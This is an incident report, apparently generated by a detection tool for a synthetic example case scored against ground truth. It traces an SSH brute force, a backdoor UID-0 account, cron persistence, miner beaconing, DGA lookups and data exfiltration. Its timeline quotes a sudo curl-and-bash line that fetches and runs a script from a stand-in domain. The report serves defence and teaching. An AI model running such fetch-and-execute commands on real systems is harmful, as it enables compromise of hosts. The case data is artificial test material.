# Incident report

_Case: `examples/case-web01` · 2,561 auth events · summary by template_

## Executive summary

Between 2026-09-14 10:02 and 2026-09-16 10:34 UTC: An attacker guessed the SSH password of 'deploy' from 203.0.113.77 at 2026-09-14 10:38 then used sudo to download and run a script from update-cdn-sync.top and installed persistence (a root-equivalent account, a cron job running a hidden binary). The host then beaconed to 198.51.100.44:3333 on a fixed timer, consistent with a cryptominer and uploaded 452 MB to 192.0.2.200:443 while resolving algorithmically generated domains as fallback command and control. The attacker later returned through the backdoor account.

## Timeline (medium and above)

| First seen (UTC) | Severity | Finding | ATT&CK |
|---|---|---|---|
| 2026-09-14 10:02 | medium | SSH brute force from one source: 395 failures in 2 ten-minute window(s) | T1110.001 |
| 2026-09-14 10:02 | critical | 395 failed attempts on 8 usernames from 203.0.113.77, then 1 successful login(s) as 'deploy' | T1110.001 / T1078 |
| 2026-09-14 10:13 | medium | SSH brute force from one source: 347 failures in 2 ten-minute window(s) | T1110.001 |
| 2026-09-14 10:13 | high | 2 other sources guessed the same usernames (Jaccard >= 0.5) within 90 min of 203.0.113.77: 203.0.113.90, 203.0.113.81 | T1110.001 |
| 2026-09-14 10:23 | medium | SSH brute force from one source: 394 failures in 2 ten-minute window(s) | T1110.001 |
| 2026-09-14 10:41 | high | Download or execute from a temp path through sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -fsSL http://update-cdn-sync.top/i.sh -o /tmp | T1105 / T1059.004 |
| 2026-09-14 10:41 | high | update-cdn-sync.top (198.51.100.10) appears in a sudo download command; host pulled 2.1 MB from it | T1105 |
| 2026-09-14 10:42 | high | Download or execute from a temp path through sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash /tmp/.i.sh | T1105 / T1059.004 |
| 2026-09-14 10:42 | critical | New account created with UID 0: new user: name=sysupdate, UID=0, GID=0, home=/var/lib/sysupdate, shell=/bin/bash | T1136.001 |
| 2026-09-14 10:42 | critical | Account 'sysupdate' was created at 2026-09-14 10:42 and later logged in over SSH from 198.51.100.23 | T1078 / T1136.001 |
| 2026-09-14 10:44 | high | Cron runs a hidden or temp-path binary: (root) CMD (/usr/local/bin/.kworker -c /etc/.kw.json >/dev/null 2>&1) (288 times until 2026-09-16 10:34) | T1053.003 |
| 2026-09-14 10:45 | high | 2160 connections to 198.51.100.44:3333, every 60s (CV 0.040), 0.8 MB out | T1071 / T1496 |
| 2026-09-14 10:45 | high | 25 likely generated domains, all NXDOMAIN, e.g. ivqvlemalpiuzow.info, ravteolfkgbsg.top, vkvmzcabvqhcnodv.xyz | T1568.002 |
| 2026-09-15 02:37 | critical | 452 MB sent to 192.0.2.200:443 over 31 min; host contacted it 1 time(s) in total | T1041 / T1048 |

Background: 16 medium findings not linked to this incident (16 unrelated sources brute-forcing SSH). Listed in findings.json.

## ATT&CK techniques observed

- **T1041** Exfiltration Over C2 Channel
- **T1048** Exfiltration Over Alternative Protocol
- **T1053.003** Scheduled Task/Job: Cron
- **T1059.004** Command and Scripting Interpreter: Unix Shell
- **T1071** Application Layer Protocol
- **T1078** Valid Accounts
- **T1105** Ingress Tool Transfer
- **T1110.001** Brute Force: Password Guessing
- **T1136.001** Create Account: Local Account
- **T1496** Resource Hijacking
- **T1568.002** Dynamic Resolution: Domain Generation Algorithms

## Indicators of compromise

| Type | Value | First seen | Raised by |
|---|---|---|---|
| ip | `203.0.113.77` | 2026-09-14 10:02 | brute_force_then_success, sigma:ssh_bruteforce |
| ip | `203.0.113.81` | 2026-09-14 10:13 | linked_bruteforce_sources, sigma:ssh_bruteforce |
| ip | `203.0.113.90` | 2026-09-14 10:13 | linked_bruteforce_sources, sigma:ssh_bruteforce |
| ip | `198.51.100.10` | 2026-09-14 10:41 | stager_download |
| ip | `198.51.100.23` | 2026-09-14 10:42 | backdoor_account_login |
| ip | `198.51.100.44` | 2026-09-14 10:45 | beaconing |
| ip | `192.0.2.200` | 2026-09-15 02:37 | large_upload |
| domain | `update-cdn-sync.top` | 2026-09-14 10:41 | stager_download |
| domain | `alligwnjhqeqw.xyz` | 2026-09-14 10:45 | dga_lookups |
| domain | `gkjopwphforlfg.info` | 2026-09-14 10:45 | dga_lookups |
| domain | `gnpbrstxiybnn.info` | 2026-09-14 10:45 | dga_lookups |
| domain | `hvnbmgytdyrh.top` | 2026-09-14 10:45 | dga_lookups |
| domain | `iubvtzzmnntvi.xyz` | 2026-09-14 10:45 | dga_lookups |
| domain | `ivqvlemalpiuzow.info` | 2026-09-14 10:45 | dga_lookups |
| domain | `jdihkllqszyqfamnb.info` | 2026-09-14 10:45 | dga_lookups |
| domain | `kyplujfephzr.top` | 2026-09-14 10:45 | dga_lookups |
| domain | `lrqeakzviudh.info` | 2026-09-14 10:45 | dga_lookups |
| domain | `mzgsrlluxmsf.top` | 2026-09-14 10:45 | dga_lookups |
| domain | `nlfagptopfbvtkohk.top` | 2026-09-14 10:45 | dga_lookups |
| domain | `owzgxjqiavawaerin.top` | 2026-09-14 10:45 | dga_lookups |
| domain | `pbnzljnutjmztk.top` | 2026-09-14 10:45 | dga_lookups |
| domain | `ppulivoxfojtbikq.info` | 2026-09-14 10:45 | dga_lookups |
| domain | `qomtqwhoozbyh.xyz` | 2026-09-14 10:45 | dga_lookups |
| domain | `ravteolfkgbsg.top` | 2026-09-14 10:45 | dga_lookups |
| domain | `rktrfwbrfqcmt.xyz` | 2026-09-14 10:45 | dga_lookups |
| domain | `taiyzkfhzaqbh.info` | 2026-09-14 10:45 | dga_lookups |
| domain | `tpptmrauxcgzvillw.xyz` | 2026-09-14 10:45 | dga_lookups |
| domain | `vkevcxjjwfyv.info` | 2026-09-14 10:45 | dga_lookups |
| domain | `vkvmzcabvqhcnodv.xyz` | 2026-09-14 10:45 | dga_lookups |
| domain | `weazbcnrgzmzdwlgj.xyz` | 2026-09-14 10:45 | dga_lookups |
| domain | `wibnipltuxbq.xyz` | 2026-09-14 10:45 | dga_lookups |
| domain | `wvrpttdgrtwvmshcnl.xyz` | 2026-09-14 10:45 | dga_lookups |
| domain | `wyzmqvovbdrsvjly.info` | 2026-09-14 10:45 | dga_lookups |
| user | `deploy` | 2026-09-14 10:02 | brute_force_then_success, sigma:sudo_download_execute |
| user | `sysupdate` | 2026-09-14 10:42 | backdoor_account_login, sigma:linux_uid0_account, sigma:linux_useradd |
| file | `/etc/.kw.json` | - | command_paths |
| file | `/tmp/.i.sh` | - | command_paths |
| file | `/usr/local/bin/.kworker` | - | command_paths |

## Containment and eradication

1. Reset the password of the compromised account, revoke its SSH keys and sessions, and disable password authentication for SSH.
2. Block the linked brute-force sources at the firewall alongside the source that got in.
3. Remove the downloaded files, review sudo rights for the account, and block the download domain at DNS.
4. Sinkhole the stager domain and block its IP at egress.
5. Lock and remove the UID-0 account after imaging the host; diff /etc/passwd and /etc/shadow against the last known-good copy.
6. Remove attacker SSH keys from every authorized_keys file and block the source IP.
7. Remove the cron entry and the binary after collecting a copy and its hash for analysis.
8. Block the destination at egress and confirm the process holding the connection is gone.
9. Sinkhole the generated domains and alert on further NXDOMAIN bursts from this host.
10. Block the destination, estimate what data was readable by the compromised accounts, and start breach assessment.

## Detections to keep

| Detection | Logic |
|---|---|
| Brute force followed by success from the same source | Sequence over auth logs: >= 20 failures then an accepted login from that IP within 24 h |
| UID-0 account creation | Sigma rule linux_uid0_account (already in sigma/) |
| Download-and-execute through sudo | Sigma rule sudo_download_execute; add the domain to an allow-list review |
| Timer-driven egress | Inter-arrival coefficient of variation < 0.15 over >= 30 connections to one destination |
| NXDOMAIN burst from a server | Servers rarely look up names that do not exist; alert on >= 10 NXDOMAIN per hour per host |
| Large upload to a first-seen destination | >= 100 MB outbound to a destination contacted <= 3 times |

## Scored against ground truth

| IOC type | Found / expected | Extra |
|---|---|---|
| ip | 7 / 7 | 0 |
| domain | 26 / 26 | 0 |
| user | 2 / 2 | 0 |
| file | 3 / 3 | 0 |

Attack stages detected: 10 / 10
